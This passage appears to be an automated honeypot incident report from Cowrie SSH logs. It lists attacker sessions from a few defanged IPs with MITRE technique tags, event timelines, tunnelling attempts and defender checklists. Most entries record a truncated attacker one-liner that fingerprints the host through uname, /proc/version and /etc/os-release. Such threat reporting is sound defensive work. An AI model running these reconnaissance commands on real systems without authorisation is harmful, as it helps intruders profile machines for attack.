| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:14:02` | `cowrie.session.connect` |
| `2026-07-06 03:14:02` | `cowrie.client.version` |
| `2026-07-06 03:14:03` | `cowrie.client.kex` |
| `2026-07-06 03:14:03` | `cowrie.login.success` |
| `2026-07-06 03:14:03` | `cowrie.direct-tcpip.request` |
| `2026-07-06 03:14:03` | `cowrie.direct-tcpip.data` |
| `2026-07-06 03:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20b8946eb57e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:14 |
| **Last Seen** | 2026-07-06 03:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:14:55` | `cowrie.session.connect` |
| `2026-07-06 03:14:56` | `cowrie.client.version` |
| `2026-07-06 03:14:56` | `cowrie.client.kex` |
| `2026-07-06 03:14:58` | `cowrie.login.success` |
| `2026-07-06 03:15:00` | `cowrie.session.params` |
| `2026-07-06 03:15:00` | `cowrie.command.input` |
| `2026-07-06 03:15:00` | `cowrie.command.input` |
| `2026-07-06 03:15:00` | `cowrie.command.input` |
| `2026-07-06 03:15:00` | `cowrie.command.input` |
| `2026-07-06 03:15:00` | `cowrie.command.input` |
| `2026-07-06 03:15:00` | `cowrie.command.success` |
| `2026-07-06 03:15:00` | `cowrie.command.input` |
| `2026-07-06 03:15:00` | `cowrie.command.input` |
| `2026-07-06 03:15:00` | `cowrie.command.input` |
| `2026-07-06 03:15:00` | `cowrie.command.input` |
| `2026-07-06 03:15:01` | `cowrie.log.closed` |
| `2026-07-06 03:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7840fedb0e9d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:15 |
| **Last Seen** | 2026-07-06 03:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:15:56` | `cowrie.session.connect` |
| `2026-07-06 03:15:57` | `cowrie.client.version` |
| `2026-07-06 03:15:57` | `cowrie.client.kex` |
| `2026-07-06 03:16:00` | `cowrie.login.success` |
| `2026-07-06 03:16:02` | `cowrie.session.params` |
| `2026-07-06 03:16:02` | `cowrie.command.input` |
| `2026-07-06 03:16:02` | `cowrie.command.input` |
| `2026-07-06 03:16:02` | `cowrie.command.input` |
| `2026-07-06 03:16:02` | `cowrie.command.input` |
| `2026-07-06 03:16:02` | `cowrie.command.input` |
| `2026-07-06 03:16:02` | `cowrie.command.success` |
| `2026-07-06 03:16:02` | `cowrie.command.input` |
| `2026-07-06 03:16:02` | `cowrie.command.input` |
| `2026-07-06 03:16:02` | `cowrie.command.input` |
| `2026-07-06 03:16:02` | `cowrie.command.input` |
| `2026-07-06 03:16:02` | `cowrie.log.closed` |
| `2026-07-06 03:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5453f0deabbe

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 03:16 |
| **Last Seen** | 2026-07-06 03:16 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:16:16` | `cowrie.session.connect` |
| `2026-07-06 03:16:17` | `cowrie.client.version` |
| `2026-07-06 03:16:17` | `cowrie.client.kex` |
| `2026-07-06 03:16:23` | `cowrie.login.success` |
| `2026-07-06 03:16:26` | `cowrie.session.params` |
| `2026-07-06 03:16:26` | `cowrie.command.input` |
| `2026-07-06 03:16:29` | `cowrie.log.closed` |
| `2026-07-06 03:16:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c48462018c0d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:16 |
| **Last Seen** | 2026-07-06 03:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:16:57` | `cowrie.session.connect` |
| `2026-07-06 03:16:57` | `cowrie.client.version` |
| `2026-07-06 03:16:57` | `cowrie.client.kex` |
| `2026-07-06 03:17:00` | `cowrie.login.success` |
| `2026-07-06 03:17:02` | `cowrie.session.params` |
| `2026-07-06 03:17:02` | `cowrie.command.input` |
| `2026-07-06 03:17:02` | `cowrie.command.input` |
| `2026-07-06 03:17:02` | `cowrie.command.input` |
| `2026-07-06 03:17:02` | `cowrie.command.input` |
| `2026-07-06 03:17:02` | `cowrie.command.input` |
| `2026-07-06 03:17:02` | `cowrie.command.success` |
| `2026-07-06 03:17:02` | `cowrie.command.input` |
| `2026-07-06 03:17:02` | `cowrie.command.input` |
| `2026-07-06 03:17:02` | `cowrie.command.input` |
| `2026-07-06 03:17:02` | `cowrie.command.input` |
| `2026-07-06 03:17:03` | `cowrie.log.closed` |
| `2026-07-06 03:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03b59243e71e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:17 |
| **Last Seen** | 2026-07-06 03:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:17:57` | `cowrie.session.connect` |
| `2026-07-06 03:17:58` | `cowrie.client.version` |
| `2026-07-06 03:17:58` | `cowrie.client.kex` |
| `2026-07-06 03:18:01` | `cowrie.login.success` |
| `2026-07-06 03:18:03` | `cowrie.session.params` |
| `2026-07-06 03:18:03` | `cowrie.command.input` |
| `2026-07-06 03:18:03` | `cowrie.command.input` |
| `2026-07-06 03:18:03` | `cowrie.command.input` |
| `2026-07-06 03:18:03` | `cowrie.command.input` |
| `2026-07-06 03:18:03` | `cowrie.command.input` |
| `2026-07-06 03:18:03` | `cowrie.command.success` |
| `2026-07-06 03:18:03` | `cowrie.command.input` |
| `2026-07-06 03:18:03` | `cowrie.command.input` |
| `2026-07-06 03:18:03` | `cowrie.command.input` |
| `2026-07-06 03:18:03` | `cowrie.command.input` |
| `2026-07-06 03:18:03` | `cowrie.log.closed` |
| `2026-07-06 03:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59c74e6fdd0a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 03:18 |
| **Last Seen** | 2026-07-06 03:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:18:26` | `cowrie.session.connect` |
| `2026-07-06 03:18:26` | `cowrie.client.version` |
| `2026-07-06 03:18:26` | `cowrie.client.kex` |
| `2026-07-06 03:18:27` | `cowrie.login.success` |
| `2026-07-06 03:18:27` | `cowrie.direct-tcpip.request` |
| `2026-07-06 03:18:27` | `cowrie.direct-tcpip.data` |
| `2026-07-06 03:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc3d707da812

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:18 |
| **Last Seen** | 2026-07-06 03:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:18:57` | `cowrie.session.connect` |
| `2026-07-06 03:18:58` | `cowrie.client.version` |
| `2026-07-06 03:18:58` | `cowrie.client.kex` |
| `2026-07-06 03:19:01` | `cowrie.login.success` |
| `2026-07-06 03:19:02` | `cowrie.session.params` |
| `2026-07-06 03:19:02` | `cowrie.command.input` |
| `2026-07-06 03:19:02` | `cowrie.command.input` |
| `2026-07-06 03:19:02` | `cowrie.command.input` |
| `2026-07-06 03:19:02` | `cowrie.command.input` |
| `2026-07-06 03:19:02` | `cowrie.command.input` |
| `2026-07-06 03:19:02` | `cowrie.command.success` |
| `2026-07-06 03:19:02` | `cowrie.command.input` |
| `2026-07-06 03:19:02` | `cowrie.command.input` |
| `2026-07-06 03:19:02` | `cowrie.command.input` |
| `2026-07-06 03:19:02` | `cowrie.command.input` |
| `2026-07-06 03:19:03` | `cowrie.log.closed` |
| `2026-07-06 03:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-694231fc514b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:19 |
| **Last Seen** | 2026-07-06 03:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:19:56` | `cowrie.session.connect` |
| `2026-07-06 03:19:57` | `cowrie.client.version` |
| `2026-07-06 03:19:57` | `cowrie.client.kex` |
| `2026-07-06 03:20:00` | `cowrie.login.success` |
| `2026-07-06 03:20:01` | `cowrie.session.params` |
| `2026-07-06 03:20:01` | `cowrie.command.input` |
| `2026-07-06 03:20:01` | `cowrie.command.input` |
| `2026-07-06 03:20:01` | `cowrie.command.input` |
| `2026-07-06 03:20:01` | `cowrie.command.input` |
| `2026-07-06 03:20:01` | `cowrie.command.input` |
| `2026-07-06 03:20:01` | `cowrie.command.success` |
| `2026-07-06 03:20:01` | `cowrie.command.input` |
| `2026-07-06 03:20:01` | `cowrie.command.input` |
| `2026-07-06 03:20:01` | `cowrie.command.input` |
| `2026-07-06 03:20:01` | `cowrie.command.input` |
| `2026-07-06 03:20:02` | `cowrie.log.closed` |
| `2026-07-06 03:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c75a12acf66

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:20 |
| **Last Seen** | 2026-07-06 03:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:20:56` | `cowrie.session.connect` |
| `2026-07-06 03:20:56` | `cowrie.client.version` |
| `2026-07-06 03:20:56` | `cowrie.client.kex` |
| `2026-07-06 03:20:59` | `cowrie.login.success` |
| `2026-07-06 03:21:00` | `cowrie.session.params` |
| `2026-07-06 03:21:00` | `cowrie.command.input` |
| `2026-07-06 03:21:00` | `cowrie.command.input` |
| `2026-07-06 03:21:00` | `cowrie.command.input` |
| `2026-07-06 03:21:00` | `cowrie.command.input` |
| `2026-07-06 03:21:00` | `cowrie.command.input` |
| `2026-07-06 03:21:00` | `cowrie.command.success` |
| `2026-07-06 03:21:00` | `cowrie.command.input` |
| `2026-07-06 03:21:00` | `cowrie.command.input` |
| `2026-07-06 03:21:00` | `cowrie.command.input` |
| `2026-07-06 03:21:00` | `cowrie.command.input` |
| `2026-07-06 03:21:01` | `cowrie.log.closed` |
| `2026-07-06 03:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b8da36eef1d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:21 |
| **Last Seen** | 2026-07-06 03:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:21:55` | `cowrie.session.connect` |
| `2026-07-06 03:21:56` | `cowrie.client.version` |
| `2026-07-06 03:21:56` | `cowrie.client.kex` |
| `2026-07-06 03:21:58` | `cowrie.login.success` |
| `2026-07-06 03:22:00` | `cowrie.session.params` |
| `2026-07-06 03:22:00` | `cowrie.command.input` |
| `2026-07-06 03:22:00` | `cowrie.command.input` |
| `2026-07-06 03:22:00` | `cowrie.command.input` |
| `2026-07-06 03:22:00` | `cowrie.command.input` |
| `2026-07-06 03:22:00` | `cowrie.command.input` |
| `2026-07-06 03:22:00` | `cowrie.command.success` |
| `2026-07-06 03:22:00` | `cowrie.command.input` |
| `2026-07-06 03:22:00` | `cowrie.command.input` |
| `2026-07-06 03:22:00` | `cowrie.command.input` |
| `2026-07-06 03:22:00` | `cowrie.command.input` |
| `2026-07-06 03:22:00` | `cowrie.log.closed` |
| `2026-07-06 03:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf05b866a824

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:22 |
| **Last Seen** | 2026-07-06 03:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:22:55` | `cowrie.session.connect` |
| `2026-07-06 03:22:56` | `cowrie.client.version` |
| `2026-07-06 03:22:56` | `cowrie.client.kex` |
| `2026-07-06 03:22:58` | `cowrie.login.success` |
| `2026-07-06 03:23:00` | `cowrie.session.params` |
| `2026-07-06 03:23:00` | `cowrie.command.input` |
| `2026-07-06 03:23:00` | `cowrie.command.input` |
| `2026-07-06 03:23:00` | `cowrie.command.input` |
| `2026-07-06 03:23:00` | `cowrie.command.input` |
| `2026-07-06 03:23:00` | `cowrie.command.input` |
| `2026-07-06 03:23:00` | `cowrie.command.success` |
| `2026-07-06 03:23:00` | `cowrie.command.input` |
| `2026-07-06 03:23:00` | `cowrie.command.input` |
| `2026-07-06 03:23:00` | `cowrie.command.input` |
| `2026-07-06 03:23:00` | `cowrie.command.input` |
| `2026-07-06 03:23:00` | `cowrie.log.closed` |
| `2026-07-06 03:23:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a75594b8161

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:23 |
| **Last Seen** | 2026-07-06 03:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:23:54` | `cowrie.session.connect` |
| `2026-07-06 03:23:54` | `cowrie.client.version` |
| `2026-07-06 03:23:54` | `cowrie.client.kex` |
| `2026-07-06 03:23:57` | `cowrie.login.success` |
| `2026-07-06 03:23:58` | `cowrie.session.params` |
| `2026-07-06 03:23:58` | `cowrie.command.input` |
| `2026-07-06 03:23:58` | `cowrie.command.input` |
| `2026-07-06 03:23:58` | `cowrie.command.input` |
| `2026-07-06 03:23:58` | `cowrie.command.input` |
| `2026-07-06 03:23:58` | `cowrie.command.input` |
| `2026-07-06 03:23:58` | `cowrie.command.success` |
| `2026-07-06 03:23:58` | `cowrie.command.input` |
| `2026-07-06 03:23:58` | `cowrie.command.input` |
| `2026-07-06 03:23:58` | `cowrie.command.input` |
| `2026-07-06 03:23:58` | `cowrie.command.input` |
| `2026-07-06 03:23:59` | `cowrie.log.closed` |
| `2026-07-06 03:24:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-380b03f72e28

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:24 |
| **Last Seen** | 2026-07-06 03:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:24:52` | `cowrie.session.connect` |
| `2026-07-06 03:24:53` | `cowrie.client.version` |
| `2026-07-06 03:24:53` | `cowrie.client.kex` |
| `2026-07-06 03:24:55` | `cowrie.login.success` |
| `2026-07-06 03:24:57` | `cowrie.session.params` |
| `2026-07-06 03:24:57` | `cowrie.command.input` |
| `2026-07-06 03:24:57` | `cowrie.command.input` |
| `2026-07-06 03:24:57` | `cowrie.command.input` |
| `2026-07-06 03:24:57` | `cowrie.command.input` |
| `2026-07-06 03:24:57` | `cowrie.command.input` |
| `2026-07-06 03:24:57` | `cowrie.command.success` |
| `2026-07-06 03:24:57` | `cowrie.command.input` |
